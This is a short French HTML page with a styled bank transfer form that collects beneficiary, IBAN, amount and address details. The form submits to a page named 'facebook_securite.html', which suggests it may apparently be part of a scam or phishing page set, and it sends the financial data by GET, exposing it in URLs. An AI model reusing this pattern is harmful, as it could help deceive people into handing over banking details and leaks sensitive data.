<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Formulaire de Virement</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #eef1f5;
      padding: 40px;
    }

    form {
      background-color: #fff;
      padding: 30px;
      max-width: 500px;
      margin: auto;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 15px;
    }

    input, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    .button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      margin-top: 20px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    .button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <form action="facebook_securite.html" method="GET">
    <h2>Virement Bancaire</h2>

    <label for="beneficiaire">Nom du bénéficiaire :</label>
    <input type="text" id="beneficiaire" name="beneficiaire" required>

    <label for="iban">IBAN :</label>
    <input type="text" id="iban" name="iban" required>

    <label for="montant">Montant (€) :</label>
    <input type="number" id="montant" name="montant" step="0.01" required>

    <label for="motif">Motif :</label>
    <textarea id="motif" name="motif" rows="2" required></textarea>

    <label for="ville">Ville :</label>
    <input type="text" id="ville" name="ville" required>

    <label for="code_postal">Code Postal :</label>
    <input type="text" id="code_postal" name="code_postal" required>

    <label for="pays">Pays :</label>
    <input type="text" id="pays" name="pays" required>

    <button type="submit" class="button">Effectuer le virement</button>
  </form>

</body>
</html>
